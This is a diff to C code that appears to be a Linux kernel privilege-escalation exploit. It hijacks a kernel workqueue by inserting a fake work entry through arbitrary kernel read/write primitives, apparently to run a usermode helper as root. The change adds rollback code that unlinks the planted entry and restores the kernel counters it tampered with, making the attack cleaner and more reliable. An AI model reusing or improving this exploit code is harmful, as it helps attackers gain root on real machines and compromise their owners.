@@ -255,6 +255,7 @@ static int install_workqueue_umh_root(int fd) {
   int refcnt_changed = 0;
   int list_prev_changed = 0;
   int published = 0;
+  int unpublished = 0;
   uint32_t complete_done = 0;
   int socket_ok = 0;
   int result = 0;
@@ -646,10 +647,38 @@ cleanup:
       pr_error("root umh prepublish rollback failed\n");
     }
   } else if (!complete_done) {
-    pr_error("root umh published but incomplete; scratch retained\n");
+    /* The entry is live in the pool worklist.  Unlink it under a readback
+     * check so no kernel list keeps a next pointer into memory that only
+     * this process owns, then roll the prepublish counters back.  If the
+     * entry already moved the check fails and we leave it alone. */
+    uint64_t still_queued = 0;
+    if (root_read64(fd, worklist, &still_queued) &&
+        still_queued == fake_entry &&
+        root_restore64(fd, worklist, fake_entry, list_next)) {
+      unpublished = 1;
+      if (list_prev_changed) {
+        root_restore64(fd, worklist + sizeof(uint64_t), fake_entry,
+                       list_prev);
+      }
+      if (refcnt_changed) {
+        root_restore32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1, refcnt);
+      }
+      if (active_changed) {
+        root_restore32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1, nr_active);
+      }
+      if (inflight_changed) {
+        root_restore32(fd, inflight_addr, nr_inflight + 1, nr_inflight);
+      }
+      pr_warning("root umh published but incomplete; entry unlinked "
+                 "next=%016llx\n", (unsigned long long)list_next);
+    } else {
+      pr_error("root umh published but incomplete; entry still queued "
+               "next=%016llx scratch retained\n",
+               (unsigned long long)still_queued);
+    }
   }
 
-  if (scratch_saved && (!published || complete_done)) {
+  if (scratch_saved && (!published || complete_done || unpublished)) {
     int work_restore = root_write_data(
         fd, fake_work_addr, saved_work, sizeof(saved_work));
     int data_restore = root_write_data(
